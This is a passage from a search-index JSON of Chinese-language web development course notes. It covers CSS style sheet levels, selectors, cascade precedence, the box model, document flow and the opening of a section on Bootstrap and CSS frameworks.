\u7684\u6837\u5f0f\u8868\u8bed\u8a00\u3002\u5b83\u7684\u4e3b\u8981\u76ee\u7684\u662f\u6307\u5b9a\u6807\u8bb0\u8bed\u8a00\uff08\u5982 HTML \u6216\u4efb\u4f55 XML \u6587\u6863\uff09\u7684\u5448\u73b0\uff08\u5e03\u5c40\u548c\u6837\u5f0f\uff09\u3002\u901a\u8fc7\u4f7f\u7528 CSS\uff0c\u53ef\u4ee5\u5c06\u5185\u5bb9\u7684\u5448\u73b0\u4e0e\u5185\u5bb9\u672c\u8eab\u5206\u79bb\u5f00\u6765\u3002\u5b83\u53d6\u4ee3\u4e86\u8bb8\u591a\u5c06\u5448\u73b0\u4e0e\u5185\u5bb9\u6df7\u5408\u5728\u4e00\u8d77\u7684 HTML \u5c5e\u6027\u3002</p>"},{"location":"cs/mern/3403/l3/#advantages-of-separating-css-from-html","title":"Advantages of separating CSS from HTML","text":"<p>\u5c06 CSS \u4e0e HTML \u5206\u79bb\u5e26\u6765\u8bb8\u591a\u4f18\u52bf:</p> <ul> <li>Speed\uff08\u901f\u5ea6\uff09: \u6837\u5f0f\u8868\u53ea\u9700\u4e0b\u8f7d\u4e00\u6b21\uff0c\u800c\u4e0d\u662f\u6bcf\u9875\u90fd\u4e0b\u8f7d\uff08\u5982\u679c\u5185\u5bb9\u548c\u6837\u5f0f\u4fe1\u606f\u6df7\u5408\u5728\u4e00\u8d77\uff09\u3002</li> <li>Maintainability\uff08\u53ef\u7ef4\u62a4\u6027\uff09: \u53ef\u4ee5\u201c\u96c6\u4e2d\u201d\u7ef4\u62a4\uff0c\u66f4\u5bb9\u6613\u66f4\u65b0\u3002</li> <li>Accessibility\uff08\u53ef\u8bbf\u95ee\u6027\uff09: \u9875\u9762\u5728\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u548c\u8bbe\u5907\u4e0a\u663e\u793a\u76f8\u4f3c\u3002</li> <li>Portability\uff08\u53ef\u79fb\u690d\u6027\uff09: \u5728\u6240\u6709\u652f\u6301\u6d4f\u89c8\u5668\u7684\u8bbe\u5907\u4e0a\u4fdd\u6301\u4e00\u81f4\u7684\u6837\u5f0f\u3002</li> <li>Reduced work\uff08\u51cf\u5c11\u5de5\u4f5c\u91cf\uff09: \u4f8b\u5982\uff0c\u4e0d\u5fc5\u4e3a\u6bcf\u4e2a\u5143\u7d20\u6307\u5b9a\u5bf9\u9f50\u65b9\u5f0f\u3002</li> <li>Consistency\uff08\u4e00\u81f4\u6027\uff09: \u53ef\u4ee5\u4f7f\u7ec4\u7ec7\u7684\u7f51\u9875\u5177\u6709\u4e00\u81f4\u7684\u201c\u5916\u89c2\u548c\u611f\u89c9\u201d\uff0c\u4e0e\u4f01\u4e1a\u5f62\u8c61\u548c\u54c1\u724c\u5339\u914d\u3002</li> </ul>"},{"location":"cs/mern/3403/l3/#different-ways-of-specifying-styles","title":"Different ways of specifying styles","text":"<p>\u6709\u4e09\u79cd\u7ea7\u522b\u7684\u6837\u5f0f\u8868:</p> <ol> <li>Inline styles\uff08\u5185\u8054\u6837\u5f0f\uff09: \u5e94\u7528\u4e8e\u5355\u4e2a\u6807\u7b7e\u3002\u6837\u5f0f\u89c4\u8303\u4f5c\u4e3a <code>style</code> \u5c5e\u6027\u7684\u503c\u51fa\u73b0\u5728\u51e0\u4e4e\u4efb\u4f55\u6807\u7b7e\u4e2d\u3002\u5f62\u5f0f\u4e3a <code>style=\"property_1: value_1; property_2: value_2; \u2026\"</code>\u3002\u8b66\u544a\uff1a\u5185\u8054\u6837\u5f0f\u8fdd\u80cc\u4e86\u6837\u5f0f\u8868\u7684\u7edf\u4e00\u6837\u5f0f\u76ee\u7684\uff0c\u4ec5\u7528\u4e8e\u8c03\u8bd5\uff0c\u4e0d\u5b9c\u591a\u7528\u3002</li> <li>Document style sheets\uff08\u6587\u6863\u6837\u5f0f\u8868\uff09: \u51fa\u73b0\u5728\u6587\u6863\u7684 <code>&lt;head&gt;</code> \u5143\u7d20\u4e2d\uff0c\u5e94\u7528\u4e8e\u6574\u4e2a\u6587\u6863\u3002\u6837\u5f0f\u89c4\u8303\u662f\u4e00\u7cfb\u5217\u89c4\u5219\uff0c\u662f <code>&lt;style&gt;</code> \u6807\u7b7e\u7684\u5185\u5bb9\uff0c\u5305\u542b\u5728\u6587\u6863 <code>&lt;head&gt;</code> \u4e2d\u3002\u5f62\u5f0f\u4e3a <code>&lt;style&gt; rule1 rule2 ... &lt;/style&gt;</code>\u3002</li> <li>External style sheets\uff08\u5916\u90e8\u6837\u5f0f\u8868\uff09: \u662f\u72ec\u7acb\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f4d\u4e8e\u4e92\u8054\u7f51\u4e0a\u7684\u4efb\u4f55\u670d\u52a1\u5668\u4e0a\uff0c\u5e76\u53ef\u4ee5\u901a\u8fc7\u6587\u6863\u7684 <code>&lt;head&gt;</code> \u5143\u7d20\u5e94\u7528\u4e8e\u4efb\u610f\u6570\u91cf\u7684\u6587\u6863\u3002\u4f7f\u7528 <code>&lt;head&gt;</code> \u4e2d\u7684 <code>&lt;link&gt;</code> \u6807\u7b7e\u6765\u6307\u5b9a\u6d4f\u89c8\u5668\u83b7\u53d6\u5e76\u4f7f\u7528\u5916\u90e8\u6837\u5f0f\u8868\u6587\u4ef6\u3002\u5f62\u5f0f\u4e3a <code>&lt;link rel=\"stylesheet\u201d type=\"text/css\u201d href=\"http://tiny.url/some.css\"&gt; &lt;/link&gt;</code>\u3002\u5176\u683c\u5f0f\u4e0e\u6587\u6863\u7ea7\u6837\u5f0f\u8868\u7684 <code>&lt;style&gt;</code> \u6807\u7b7e\u5185\u5bb9\u76f8\u540c\u3002</li> </ol>"},{"location":"cs/mern/3403/l3/#the-purpose-of-the-different-selectors-and-common-styles","title":"The purpose of the different selectors and common styles","text":""},{"location":"cs/mern/3403/l3/#css-selectors","title":"CSS selectors","text":"<p>Selector\uff08\u9009\u62e9\u5668\uff09\u51b3\u5b9a\u4e86\u6837\u5f0f\u5e94\u7528\u4e8e\u54ea\u4e9b\u5143\u7d20\u3002\u9009\u62e9\u5668\u7684\u76ee\u7684\u662f\u7cbe\u786e\u5730\u5339\u914d HTML \u6587\u6863\u4e2d\u7684\u7279\u5b9a\u5143\u7d20\uff0c\u4ee5\u4fbf\u5e94\u7528\u6837\u5f0f\u3002\u6709\u57fa\u672c\u7684\u9009\u62e9\u5668\u7c7b\u578b\u548c\u7ec4\u5408\u5668\u3002</p> <p>Basic selectors\uff08\u57fa\u672c\u9009\u62e9\u5668\uff09\u57fa\u4e8e\u4e00\u4e2a\u7279\u5b9a\u6807\u51c6\u8fdb\u884c\u9009\u62e9:</p> <ul> <li>Universal selector <code>*</code>: \u5339\u914d\u6240\u6709\u5143\u7d20\u3002</li> <li>Element selector <code>element</code>: \u5339\u914d\u7279\u5b9a\u7c7b\u578b\u7684\u5143\u7d20\u3002\u4f8b\u5982\uff0c<code>p</code> \u5339\u914d\u6240\u6709 <code>&lt;p&gt;</code> \u5143\u7d20\u3002</li> <li>Attribute selector <code>[attribute=value]</code>: \u5339\u914d\u5177\u6709\u6307\u5b9a\u5c5e\u6027\u548c\u503c\u7684\u4efb\u4f55\u5143\u7d20\u3002\u503c\u53ef\u4ee5\u7701\u7565\uff0c\u4ee5\u9009\u62e9\u5177\u6709\u8be5\u5c5e\u6027\uff08\u4efb\u4f55\u503c\uff09\u7684\u5143\u7d20\u3002</li> <li>Class selector <code>.class</code>: \u5141\u8bb8\u5bf9\u4e00\u7ec4\u5143\u7d20\u8fdb\u884c\u5206\u7ec4\u3002\u901a\u8fc7 <code>class</code> \u7279\u6b8a\u5c5e\u6027\u8bbe\u7f6e\u7c7b\u3002\u4f8b\u5982\uff0c<code>.important</code> \u5339\u914d\u5177\u6709 <code>class=\"important\"</code> \u7684\u5143\u7d20\u3002</li> <li>ID selector <code>#id</code>: \u9009\u62e9\u5177\u6709\u7279\u6b8a <code>id</code> \u5c5e\u6027\u7684\u5143\u7d20\u3002\u4e0e class \u4e0d\u540c\uff0c\u6bcf\u4e2a id \u503c\u5728\u6587\u6863\u4e2d\u53ea\u80fd\u51fa\u73b0\u4e00\u6b21\u3002\u4f8b\u5982\uff0c<code>#heading1</code> \u5339\u914d\u5177\u6709 <code>id=\"heading1\"</code> \u7684\u5143\u7d20\u3002</li> <li>Pseudo-class selector <code>:state</code>: \u5141\u8bb8\u6839\u636e\u5143\u7d20\u7684\u72b6\u6001\uff08\u4f8b\u5982 <code>hover</code> \u60ac\u505c\u3001<code>focus</code> \u805a\u7126\u3001<code>valid</code> \u6709\u6548\u3001<code>visited</code> \u5df2\u8bbf\u95ee\uff09\u9009\u62e9\u5143\u7d20\u3002\u4f8b\u5982\uff0c<code>p:hover</code> \u5339\u914d\u9f20\u6807\u60ac\u505c\u5728\u5176\u4e0a\u7684\u6bb5\u843d\u5143\u7d20\u3002</li> <li>Pseudo-element selector <code>::pseudo-element</code>: \u5141\u8bb8\u5bf9\u5143\u7d20\u7684\u7279\u5b9a\u90e8\u5206\uff08\u4f8b\u5982 <code>first-line</code> \u7b2c\u4e00\u884c\u3001<code>first-letter</code> \u7b2c\u4e00\u4e2a\u5b57\u6bcd\u3001<code>backdrop</code> \u80cc\u666f\uff09\u8fdb\u884c\u6837\u5f0f\u8bbe\u7f6e\u3002\u4f8b\u5982\uff0c<code>p::first-letter</code> \u5339\u914d\u6bcf\u4e2a\u6bb5\u843d\u5143\u7d20\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u3002</li> </ul> <p>Selector combinators\uff08\u9009\u62e9\u5668\u7ec4\u5408\u5668\uff09\u5141\u8bb8\u5c06\u591a\u4e2a\u6807\u51c6\u7ec4\u5408\u5728\u4e00\u8d77:</p> <ul> <li>Group selector <code>s1, s2, s3</code>: \u5145\u5f53\u903b\u8f91\u201c\u6216\u201d\uff0c\u5c06\u6837\u5f0f\u5e94\u7528\u4e8e\u5339\u914d s1 \u6216 s2 \u6216 s3 \u7684\u5143\u7d20\u3002\u4f8b\u5982\uff0c<code>h2, b</code> \u5339\u914d\u6240\u6709 <code>&lt;h2&gt;</code> \u5143\u7d20\u548c <code>&lt;b&gt;</code> \u5143\u7d20\u3002</li> <li>Descendant selector <code>s1 s2</code>: \u9009\u62e9\u6811\u4e2d\u4f4d\u4e8e\u5339\u914d s1 \u7684\u5143\u7d20\u4e0b\u9762\u7684\u6240\u6709\u5339\u914d s2 \u7684\u5143\u7d20\u3002\u4f8b\u5982\uff0c<code>p b</code> \u5339\u914d\u6240\u6709\u4f4d\u4e8e <code>&lt;p&gt;</code> \u5143\u7d20\u4e0b\u9762\u7684 <code>&lt;b&gt;</code> \u5143\u7d20\u3002</li> <li>Direct descendant selector <code>s1 &gt; s2</code>: \u9009\u62e9\u6811\u4e2d\u76f4\u63a5\u4f4d\u4e8e\u5339\u914d s1 \u7684\u5143\u7d20\u4e0b\u9762\u7684\u6240\u6709\u5339\u914d s2 \u7684\u5143\u7d20\u3002\u4f8b\u5982\uff0c<code>p &gt; b</code> \u5339\u914d\u6240\u6709\u76f4\u63a5\u4f4d\u4e8e <code>&lt;p&gt;</code> \u5143\u7d20\u4e0b\u9762\u7684 <code>&lt;b&gt;</code> \u5143\u7d20\u3002</li> <li>Sibling selector <code>s1 ~ s2</code>: \u9009\u62e9\u6811\u4e2d\u4e0e\u5339\u914d s1 \u7684\u5143\u7d20\u5171\u4eab\u540c\u4e00\u7236\u5143\u7d20\u7684\u6240\u6709\u5339\u914d s2 \u7684\u5143\u7d20\u3002\u4f8b\u5982\uff0c<code>h1 ~ h2</code> \u5339\u914d\u4f4d\u4e8e <code>&lt;h1&gt;</code> \u5143\u7d20\u4e4b\u540e\uff08\u5728\u540c\u4e00\u7236\u5143\u7d20\u4e0b\uff09\u7684\u6240\u6709 <code>&lt;h2&gt;</code> \u5143\u7d20\u3002</li> <li>Direct sibling selector <code>s1 + s2</code>: \u9009\u62e9\u6811\u4e2d\u7d27\u63a5\u5728\u5339\u914d s1 \u7684\u5143\u7d20\u4e4b\u540e\uff08\u5728\u540c\u4e00\u7236\u5143\u7d20\u4e0b\uff09\u7684\u7b2c\u4e00\u4e2a\u5339\u914d s2 \u7684\u5143\u7d20\u3002\u4f8b\u5982\uff0c<code>h1 + h2</code> \u5339\u914d\u7d27\u63a5\u5728 <code>&lt;h1&gt;</code> \u5143\u7d20\u4e4b\u540e\uff08\u5728\u540c\u4e00\u7236\u5143\u7d20\u4e0b\uff09\u7684\u7b2c\u4e00\u4e2a <code>&lt;h2&gt;</code> \u5143\u7d20\u3002</li> </ul> <p>\u7f16\u5199\u80fd\u591f\u6269\u5c55\u5230\u5927\u578b\u7f51\u9875\u4e14\u4e0d\u4f1a\u51b2\u7a81\u7684 CSS \u9009\u62e9\u5668\u96c6\u5408\u662f\u4e00\u9879\u6280\u80fd\u3002</p>"},{"location":"cs/mern/3403/l3/#common-styles","title":"Common styles","text":"<p>CSS \u6709\u975e\u5e38\u591a\u7684\u5c5e\u6027\uff0c\u5e76\u4e14\u5217\u8868\u6301\u7eed\u589e\u957f\u3002\u6765\u6e90\u4e2d\u63d0\u5230\u4e86\u4e00\u4e9b\u5c06\u6db5\u76d6\u7684\u57fa\u672c\u5c5e\u6027\u7ec4:</p> <ul> <li>Text\uff08\u6587\u672c\uff09\u5c5e\u6027: \u4f8b\u5982 <code>font-size</code> \u5b57\u4f53\u5927\u5c0f\u3001<code>font-style</code> \u5b57\u4f53\u6837\u5f0f\u3001<code>font-weight</code> \u5b57\u4f53\u7c97\u7ec6\u3001<code>font</code> \u5b57\u4f53\uff08\u7b80\u5199\uff09\u3001<code>text-decoration</code> \u6587\u672c\u4fee\u9970\u3001<code>letter-spacing</code> \u5b57\u6bcd\u95f4\u8ddd\u3001<code>text-indent</code> \u6587\u672c\u7f29\u8fdb\u3001<code>text-align</code> \u6587\u672c\u5bf9\u9f50\u3002</li> <li>Background\uff08\u80cc\u666f\uff09\u5c5e\u6027: \u6765\u6e90\u672a\u8be6\u7ec6\u5c55\u5f00\u3002</li> <li>Borders\uff08\u8fb9\u6846\uff09\u5c5e\u6027: \u4f8b\u5982 <code>border-style</code> \u8fb9\u6846\u6837\u5f0f\u3001<code>border-width</code> \u8fb9\u6846\u5bbd\u5ea6\u3001<code>border-color</code> \u8fb9\u6846\u989c\u8272\u3002</li> <li>The box model\uff08\u76d2\u6a21\u578b\uff09\u5c5e\u6027: \u5305\u62ec <code>margin</code> \u5916\u8fb9\u8ddd\u3001<code>border</code> \u8fb9\u6846\u3001<code>padding</code> \u5185\u8fb9\u8ddd\u3001<code>width</code> \u5bbd\u5ea6\u3001<code>height</code> \u9ad8\u5ea6\u3002</li> <li>Colors\uff08\u989c\u8272\uff09\u5c5e\u6027: <code>color</code> \u5c5e\u6027\u6307\u5b9a\u5143\u7d20\u7684\u524d\u666f\u8272\u3002\u989c\u8272\u53ef\u4ee5\u901a\u8fc7\u9884\u5b9a\u4e49\u7684\u540d\u79f0\u6216\u5341\u516d\u8fdb\u5236\u503c\u6307\u5b9a\u3002</li> <li>Tables\uff08\u8868\u683c\uff09\u5c5e\u6027: \u6765\u6e90\u672a\u8be6\u7ec6\u5c55\u5f00\u3002</li> <li>Lists\uff08\u5217\u8868\uff09\u5c5e\u6027: \u4f8b\u5982 <code>list-style-type</code> \u5217\u8868\u9879\u6807\u8bb0\u7c7b\u578b\u3002</li> </ul>"},{"location":"cs/mern/3403/l3/#conflict-resolution-and-precedence-rules-in-css","title":"Conflict resolution and precedence rules in CSS","text":"<p>\u4e00\u4e2a\u5143\u7d20\u53ef\u80fd\u6210\u4e3a\u591a\u4e2a\u89c4\u5219\u7684\u5bf9\u8c61\u3002\u8fd9\u901a\u5e38\u662f\u4e0d\u53ef\u907f\u514d\u7684\uff0c\u56e0\u4e3a\u60a8\u7684\u9875\u9762\u901a\u5e38\u4f1a\u5305\u542b\u591a\u4e2a\u5177\u6709\u51b2\u7a81\u5b9a\u4e49\u7684\u6837\u5f0f\u8868\u3002\u8fd9\u4e9b\u6837\u5f0f\u8868\u53ef\u80fd\u6765\u81ea\u4e0d\u540c\u7684\u6765\u6e90:</p> <ul> <li>User style sheets\uff08\u7528\u6237\u6837\u5f0f\u8868\uff09: \u7528\u6237\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbe\u7f6e\u7f16\u5199\u7684\u6837\u5f0f\u8868\u3002</li> <li>Author style sheets\uff08\u4f5c\u8005\u6837\u5f0f\u8868\uff09: \u5f00\u53d1\u8005\u4f7f\u7528\u7684\u6837\u5f0f\u8868\u3002</li> <li>User agent style sheets\uff08\u7528\u6237\u4ee3\u7406\u6837\u5f0f\u8868\uff09: \u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u9ed8\u8ba4\u6837\u5f0f\u8868\u3002</li> </ul> <p>CSS \u901a\u8fc7 conflict resolution\uff08\u51b2\u7a81\u89e3\u51b3\uff09\u673a\u5236\u6765\u786e\u5b9a\u6700\u7ec8\u5e94\u7528\u7684\u6837\u5f0f\u3002\u7b80\u5316\u7684\u4f18\u5148\u7ea7\u89c4\u5219\u5982\u4e0b:</p> <ol> <li>First break ties by origin and importance</li> </ol> <p>\uff08\u9996\u5148\u6839\u636e\u6765\u6e90\u548c\u91cd\u8981\u6027\u6253\u7834\u50f5\u5c40\uff09:</p> <ul> <li>Transition declarations (\u7528\u4e8e\u52a8\u753b\uff0c\u4e0d\u6db5\u76d6)</li> <li>Important user agent declarations (\u91cd\u8981\u7684\u7528\u6237\u4ee3\u7406\u58f0\u660e)</li> <li>Important user declarations (\u91cd\u8981\u7684\u7528\u6237\u58f0\u660e)</li> <li>Important author declarations (\u91cd\u8981\u7684\u4f5c\u8005\u58f0\u660e)</li> <li>Normal author declarations (\u6b63\u5e38\u7684\u4f5c\u8005\u58f0\u660e)</li> <li>Normal user declarations (\u6b63\u5e38\u7684\u7528\u6237\u58f0\u660e)</li> <li>Normal user agent declarations (\u6b63\u5e38\u7684\u7528\u6237\u4ee3\u7406\u58f0\u660e) CSS priority can be overridden by the <code>!important</code> modifier\uff08CSS \u4f18\u5148\u7ea7\u53ef\u4ee5\u901a\u8fc7 <code>!important</code> \u4fee\u9970\u7b26\u8986\u76d6\uff09\u3002</li> </ul> <ol> <li>If still tied, then judge on specificity</li> </ol> <p>\uff08\u5982\u679c\u4ecd\u7136\u50f5\u6301\uff0c\u5219\u6839\u636e\u7279\u5f02\u6027\u5224\u65ad\uff09: </p> <p>Inline styles &gt; style sheet styles</p> <p>\uff08\u5185\u8054\u6837\u5f0f &gt; \u6837\u5f0f\u8868\u6837\u5f0f\uff09\u3002\u7136\u540e\u6309\u7167\u9009\u62e9\u5668\u4e2d\u4ee5\u4e0b\u5404\u9879\u7684\u6570\u91cf\u6765\u786e\u5b9a\u7279\u5f02\u6027\uff0c\u6570\u91cf\u8d8a\u591a\uff0c\u7279\u5f02\u6027\u8d8a\u9ad8\uff08\u4ece\u9ad8\u5230\u4f4e\uff09:</p> <ul> <li>Number of IDs in selector (\u9009\u62e9\u5668\u4e2d\u7684 ID \u6570\u91cf)</li> <li>Number of classes, attributes and pseudo-classes in selector (\u9009\u62e9\u5668\u4e2d\u7684 class\u3001\u5c5e\u6027\u548c\u4f2a\u7c7b\u6570\u91cf)</li> <li>Number of type and pseudo-elements in selector (\u9009\u62e9\u5668\u4e2d\u7684\u7c7b\u578b\u548c\u4f2a\u5143\u7d20\u6570\u91cf)</li> </ul> <ol> <li>If still tied, then choose whichever selector appears last\uff08\u5982\u679c\u4ecd\u7136\u50f5\u6301\uff0c\u5219\u9009\u62e9\u6700\u540e\u51fa\u73b0\u7684\u9009\u62e9\u5668\uff09\u3002</li> </ol> <p>\u5b8c\u6574\u7684\u89c4\u5219\u53ef\u4ee5\u5728 W3C \u89c4\u8303\u4e2d\u627e\u5230\u3002</p>"},{"location":"cs/mern/3403/l3/#box-model","title":"Box model","text":"<p>The box model\uff08\u76d2\u6a21\u578b\uff09\u662f CSS \u5e03\u5c40\u7684\u6838\u5fc3\u6982\u5ff5\u3002\u6bcf\u4e2a\u5143\u7d20\u57fa\u672c\u4e0a\u90fd\u6309\u7167\u56db\u4e2a\u6846\u6765\u5e03\u5c40\u3002\u5b83\u7528\u4e8e\u63a7\u5236\u5143\u7d20\u5728\u9875\u9762\u4e0a\u7684\u95f4\u8ddd\u548c\u8fb9\u6846\u3002 \u8fd9\u56db\u4e2a\u90e8\u5206\uff08\u4ece\u5185\u5230\u5916\uff09\u662f:</p> <ol> <li>Content\uff08\u5185\u5bb9\uff09: \u5143\u7d20\u5b9e\u9645\u6e32\u67d3\u7684\u5730\u65b9\u3002</li> <li>Padding\uff08\u5185\u8fb9\u8ddd\uff09: \u5143\u7d20\u8fb9\u6846\u548c\u5185\u5bb9\u4e4b\u95f4\u7684\u7a7a\u95f4\u3002\u5185\u8fb9\u8ddd\u59cb\u7ec8\u662f\u900f\u660e\u7684\u3002\u53ef\u4ee5\u4f7f\u7528 <code>padding</code>, <code>padding-left</code>, <code>padding-top</code> \u7b49\u5c5e\u6027\u8bbe\u7f6e\u5927\u5c0f\u3002</li> <li>Border\uff08\u8fb9\u6846\uff09: \u4f4d\u4e8e\u5185\u8fb9\u8ddd\u548c\u5916\u8fb9\u8ddd\u4e4b\u95f4\u3002\u53ef\u4ee5\u4f7f\u7528 <code>border-style</code>, <code>border-width</code>, <code>border-color</code> \u7b49\u5c5e\u6027\u8bbe\u7f6e\u3002</li> <li>Margin\uff08\u5916\u8fb9\u8ddd\uff09: \u5143\u7d20\u8fb9\u6846\u4e0e\u5176\u76f8\u90bb\u5143\u7d20\u4e4b\u95f4\u7684\u7a7a\u95f4\u3002\u5916\u8fb9\u8ddd\u59cb\u7ec8\u662f\u900f\u660e\u7684\u3002\u53ef\u4ee5\u4f7f\u7528 <code>margin</code>, <code>margin-left</code>, <code>margin-top</code> \u7b49\u5c5e\u6027\u8bbe\u7f6e\u5927\u5c0f\u3002</li> </ol> <p>\u8ba1\u7b97\u5143\u7d20\u7684\u603b\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u65f6\uff0c\u5fc5\u987b\u5305\u542b\u5185\u8fb9\u8ddd\u548c\u8fb9\u6846\u3002\u5916\u8fb9\u8ddd\u4e5f\u4f1a\u5f71\u54cd\u6846\u5728\u9875\u9762\u4e0a\u5360\u7528\u7684\u603b\u7a7a\u95f4\uff0c\u4f46\u5916\u8fb9\u8ddd\u4e0d\u5305\u542b\u5728\u6846\u7684\u5b9e\u9645\u5c3a\u5bf8\u4e2d\u3002\u6846\u7684\u603b\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u5728\u8fb9\u6846\u5904\u505c\u6b62\u3002</p>"},{"location":"cs/mern/3403/l3/#document-flow-model","title":"Document flow model","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5143\u7d20\u6309\u7167\u6587\u6863\u7684 normal flow\uff08\u6b63\u5e38\u6d41\uff09\u5e03\u5c40\u3002\u5b83\u4eec\u6309\u7167\u58f0\u660e\u7684\u987a\u5e8f\u5728\u9875\u9762\u4e0a\u987a\u5e8f\u663e\u793a\uff0c\u4e00\u4e2a\u5728\u53e6\u4e00\u4e2a\u4e0a\u9762\u3002</p> <p>\u6709\u4e09\u79cd\u65b9\u6cd5\u53ef\u4ee5\u8986\u76d6\u6b63\u5e38\u6d41:</p> <ol> <li> <p>The float property\uff08\u6d6e\u52a8\u5c5e\u6027\uff09: \u5143\u7d20\u6309\u7167\u6b63\u5e38\u6d41\u5e03\u5c40\uff0c\u7136\u540e\u88ab\u79fb\u52a8\u5230\u524d\u4e00\u4e2a\u5143\u7d20\u7684\u5de6\u4fa7\u6216\u53f3\u4fa7\u3002\u6709 <code>none</code>\uff08\u9ed8\u8ba4\uff09\u3001<code>left</code>\u3001<code>right</code>\u3001<code>inherit</code> \u56db\u4e2a\u503c\u3002\u4f8b\u5982\uff0c\u7528\u4e8e\u4f7f\u56fe\u50cf\u548c\u6587\u672c\u5728\u540c\u4e00\u884c\u3002</p> </li> <li> <p>The position property\uff08\u5b9a\u4f4d\u5c5e\u6027\uff09\u4f7f\u7528 </p> </li> </ol> <pre><code>top\nleft\nright\nbottom\n</code></pre> <pre><code>\u7b49\u504f\u79fb\u5c5e\u6027\u3002\u6709\u4e94\u4e2a\u503c:\n</code></pre> <ul> <li>static\uff08\u9759\u6001\uff09: \u9ed8\u8ba4\u503c\uff0c\u9075\u5faa\u6b63\u5e38\u6d41\u3002</li> <li>relative\uff08\u76f8\u5bf9\uff09: \u5143\u7d20\u76f8\u5bf9\u4e8e\u5176\u6b63\u5e38\u6d41\u4f4d\u7f6e\u8fdb\u884c\u504f\u79fb\uff0c\u4f46\u5143\u7d20\u4e0d\u4ece\u6b63\u5e38\u6d41\u4e2d\u79fb\u9664\u3002</li> <li>absolute\uff08\u7edd\u5bf9\uff09: \u5143\u7d20\u76f8\u5bf9\u4e8e\u5176\u6700\u8fd1\u7684\u5df2\u5b9a\u4f4d\u7956\u5148\u5143\u7d20\u8fdb\u884c\u504f\u79fb\u3002\u5143\u7d20\u5b8c\u5168\u4ece\u6b63\u5e38\u6d41\u4e2d\u79fb\u9664\u3002</li> <li>fixed\uff08\u56fa\u5b9a\uff09: \u5143\u7d20\u76f8\u5bf9\u4e8e\u56fa\u5b9a\u7684\u89c6\u53e3\u8fdb\u884c\u504f\u79fb\u3002\u5143\u7d20\u5b8c\u5168\u4ece\u6b63\u5e38\u6d41\u4e2d\u79fb\u9664\u3002</li> <li>sticky\uff08\u7c98\u6027\uff09: \u6839\u636e\u6eda\u52a8\u4f4d\u7f6e\u5728 <code>relative</code> \u548c <code>fixed</code> \u4e4b\u95f4\u5207\u6362\u3002</li> </ul> <ol> <li>The display property\uff08\u663e\u793a\u5c5e\u6027\uff09: \u51b3\u5b9a\u5143\u7d20\u5728\u6b63\u5e38\u6d41\u4e2d\u7684\u5904\u7406\u65b9\u5f0f\u3002\u6709\u5927\u7ea6 20 \u79cd\u53ef\u80fd\u7684\u503c\uff0c\u5982 <code>block</code>\u3001<code>inline</code>\u3001<code>flex</code>\u3001<code>grid</code>\u3001<code>inline-flex</code> \u7b49\u3002</li> </ol> <p>\u624b\u52a8\u4f7f\u7528\u539f\u751f CSS \u5e03\u5c40\u7f51\u9875\u5f88\u56f0\u96be\uff0c\u5c24\u5176\u662f\u9700\u8981\u8003\u8651\u4e0d\u540c\u5c4f\u5e55\u5c3a\u5bf8\u4e0b\u7684\u54cd\u5e94\u5f0f\u5e03\u5c40\u3002\u66f4\u53ef\u6269\u5c55\u7684\u65b9\u5f0f\u662f\u4f7f\u7528 CSS framework\uff08\u6846\u67b6\uff09\uff0c\u5b83\u4eec\u662f CSS \u4ee3\u7801\u5e93\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5feb\u901f\u6784\u5efa\u89c6\u89c9\u5438\u5f15\u4eba\u4e14\u54cd\u5e94\u5f0f\u7684\u7f51\u7ad9\u3002</p> <p>\u60a8\u5c06\u88ab\u671f\u671b\u80fd\u591f\u9605\u8bfb\u548c\u4fee\u6539 CSS \u4ee3\u7801\uff0c\u4f46\u4e0d\u4f1a\u88ab\u8981\u6c42\u7f16\u5199 CSS \u4ee3\u7801 [Query]\u3002</p>"},{"location":"cs/mern/3403/l4/","title":"4.0 Bootstrap","text":""},{"location":"cs/mern/3403/l4/#purpose-of-css-frameworks","title":"Purpose of CSS frameworks","text":"<ul> <li>CSS frameworks \u662f\u7528\u4e8e\u5f00\u53d1\u54cd\u5e94\u5f0f web \u5e94\u7528\u7684\u5f00\u6e90\u5e93\u3002</li> <li>\u5b83\u4eec\u4f7f\u7528 CSS \u548c JavaScript \u6765\u6784\u5efa\u6837\u5f0f\u7ec4\u4ef6\uff0c\u53ea\u9700\u5f88\u5c11\u7684\u52aa\u529b\u5373\u53ef\u5b9e\u73b0\u76f8\u5f53\u7f8e\u89c2\u7684\u6548\u679c\u3002</li> <li>CSS \u867d\u7136\u662f\u4e00\u79cd\u5f3a\u5927\u7684\u8bed\u8a00\uff0c\u7528\u4e8e\u4e3a\u7f51\u7ad9\u6216\u5e94\u7528\u521b\u5efa\u548c\u5b9e\u73b0\u5c55\u793a\u98ce\u683c\uff0c\u4f46\u5b58\u5728\u4e00\u4e9b\u9650\u5236\uff1a</li> <li>\u4e00\u4e9b\u7b80\u5355\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982\u5c45\u4e2d\u56fe\u7247\u6216\u6587\u672c\uff0c\u53ef\u80fd\u4e0d\u591f\u76f4\u89c2\u3002</li> <li>\u521b\u5efa\u53d6\u51b3\u4e8e\u8bbe\u5907\u89c6\u56fe\u7684\u54cd\u5e94\u5f0f\u6837\u5f0f\u5f88\u56f0\u96be\u3002</li> <li>\u5f88\u591a\u7f51\u7ad9\u4e0d\u9700\u8981 CSS \u7684\u5168\u90e8\u529f\u80fd\uff0c\u53ef\u4ee5\u4f7f\u7528\u66f4\u7b80\u5355\u7684\u64cd\u4f5c\u5b50\u96c6\u6765\u8bbe\u7f6e\u6837\u5f0f\u3002</li> <li>\u5236\u4f5c\u5438\u5f15\u4eba\u7684\u98ce\u683c\u662f\u4e00\u9879\u9ad8\u5ea6\u521b\u9020\u6027\u7684\u6d3b\u52a8\u3002</li> <li>CSS 